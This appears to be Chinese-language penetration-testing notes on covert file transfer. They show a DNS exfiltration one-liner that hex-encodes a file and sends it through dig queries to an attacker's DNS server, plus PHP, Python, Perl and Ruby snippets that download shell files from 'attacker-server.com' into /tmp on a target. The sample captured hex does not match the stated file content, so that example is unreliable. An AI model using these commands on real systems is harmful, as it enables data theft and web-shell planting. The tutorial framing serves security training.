## 利用DNS协议传输文件

![](img/e1d5a791de3439c4e4dc7427405a2e21_18.png)

![](img/e1d5a791de3439c4e4dc7427405a2e21_20.png)

这是一种在Linux环境下，通过DNS查询请求来外传文件内容的技术。其核心原理是将文件内容编码后，作为DNS查询的域名部分发送到攻击者控制的DNS服务器，从而达成数据外泄的目的。

![](img/e1d5a791de3439c4e4dc7427405a2e21_22.png)

### 操作演示与命令解析

![](img/e1d5a791de3439c4e4dc7427405a2e21_24.png)

![](img/e1d5a791de3439c4e4dc7427405a2e21_26.png)

以下是实现该技巧的一个典型命令流程。我们先观察效果，再解释其原理。

![](img/e1d5a791de3439c4e4dc7427405a2e21_28.png)

![](img/e1d5a791de3439c4e4dc7427405a2e21_30.png)

首先，创建一个测试文件 `test`，内容如下：
```
This is a test content for DNS exfil.
```

![](img/e1d5a791de3439c4e4dc7427405a2e21_32.png)

![](img/e1d5a791de3439c4e4dc7427405a2e21_33.png)

接着，执行以下命令组合：
```bash
cat test | xxd -p -c 16 | while read line; do dig @your-dns-server-ip "$line".example.com; done
```

![](img/e1d5a791de3439c4e4dc7427405a2e21_35.png)

![](img/e1d5a791de3439c4e4dc7427405a2e21_36.png)

执行后，在攻击者控制的DNS服务器日志中，会接收到一系列对类似 `[HEX字符串].example.com` 域名的查询请求。

例如，日志中可能捕获到如下查询：
```
2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d.example.com
```

![](img/e1d5a791de3439c4e4dc7427405a2e21_38.png)

![](img/e1d5a791de3439c4e4dc7427405a2e21_40.png)

这部分被捕获的字符串（本例中为 `2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d`）实际上是文件内容经过十六进制编码后的结果。我们可以使用工具（如Burp Suite的Decoder或在线工具）对其进行十六进制解码，从而还原出原始文件内容。

![](img/e1d5a791de3439c4e4dc7427405a2e21_42.png)

![](img/e1d5a791de3439c4e4dc7427405a2e21_44.png)

### 命令拆解

![](img/e1d5a791de3439c4e4dc7427405a2e21_46.png)

现在，我们来分析上述命令的每个部分：

![](img/e1d5a791de3439c4e4dc7427405a2e21_48.png)

1.  **`cat test`**：读取 `test` 文件的内容。
2.  **`xxd -p -c 16`**：这是关键步骤。
    *   `xxd` 命令用于生成文件的十六进制转储。
    *   `-p` 参数表示以“纯”十六进制格式输出，不包含地址和文本列。
    *   `-c 16` 参数指定每行输出16个字节的十六进制值。这控制了每次DNS查询携带的数据量。
3.  **`while read line; do ... done`**：这是一个Bash循环。
    *   `read line` 会逐行读取 `xxd` 命令的输出，并将每一行赋值给变量 `line`。
    *   循环体 `dig @your-dns-server-ip "$line".example.com` 会针对每一行十六进制数据，向指定的DNS服务器发起一次查询。查询的域名构成为 `[十六进制字符串].example.com`。

通过这个循环，文件被分块、编码，并通过一系列DNS查询发送出去。在接收端，只需从DNS日志中提取这些子域名部分并解码，即可重组文件。

## 利用脚本语言进行文件传输

在渗透测试中，目标机器可能没有安装 `curl`、`wget` 等常用工具，或者其使用受到限制。此时，如果目标系统存在Web服务或应用程序，很可能自带PHP、Python、Perl等脚本语言环境。我们可以利用这些环境来下载或上传文件。

以下是几种常见脚本语言的实现方法。

![](img/e1d5a791de3439c4e4dc7427405a2e21_50.png)

![](img/e1d5a791de3439c4e4dc7427405a2e21_51.png)

### PHP

![](img/e1d5a791de3439c4e4dc7427405a2e21_53.png)

PHP提供了便捷的文件操作函数。以下是利用PHP从远程服务器下载文件并保存到本地的两种方法。

**方法一：使用 `file_get_contents` 和 `file_put_contents` 函数**
```php
<?php
    $url = 'http://attacker-server.com/shell.php';
    $file_content = file_get_contents($url); // 读取远程文件内容到字符串
    file_put_contents('/tmp/shell.php', $file_content); // 将字符串写入本地文件
?>
```

**方法二：使用PHP命令行 `-r` 参数执行代码**
`php -r` 参数允许直接运行一段PHP代码，而无需将其写入 `.php` 文件。
```bash
php -r "$content=file_get_contents('http://attacker-server.com/shell.php'); file_put_contents('/tmp/shell.php', $content);"
```

### Python

Python同样可以轻松实现远程文件下载。注意Python 2和Python 3的库有所区别。

**Python 2 示例：**
```python
import urllib
url = 'http://attacker-server.com/shell.py'
urllib.urlretrieve(url, '/tmp/shell.py')
```

**Python 3 示例：**
```python
import urllib.request
url = 'http://attacker-server.com/shell.py'
urllib.request.urlretrieve(url, '/tmp/shell.py')
```

**使用Python命令行 `-c` 参数执行：**
```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker-server.com/shell.py', '/tmp/shell.py')"
```

Perl和Ruby也是常见的脚本语言，它们同样具备网络请求和文件操作能力。

![](img/e1d5a791de3439c4e4dc7427405a2e21_59.png)

**Perl 示例：**
```perl
use LWP::Simple;
getstore('http://attacker-server.com/shell.pl', '/tmp/shell.pl');
```

![](img/e1d5a791de3439c4e4dc7427405a2e21_61.png)

![](img/e1d5a791de3439c4e4dc7427405a2e21_63.png)

![](img/e1d5a791de3439c4e4dc7427405a2e21_65.png)

**Ruby 示例：**
```ruby
require 'open-uri'
File.write('/tmp/shell.rb', URI.open('http://attacker-server.com/shell.rb').read)
```

当发现目标系统存在特定的脚本环境（例如，一个PHP网站服务器、一个Python应用后端），而标准工具又不可用时，优先考虑使用对应的脚本语言来编写简短的文件传输代码，这往往是一种有效的绕过方法。
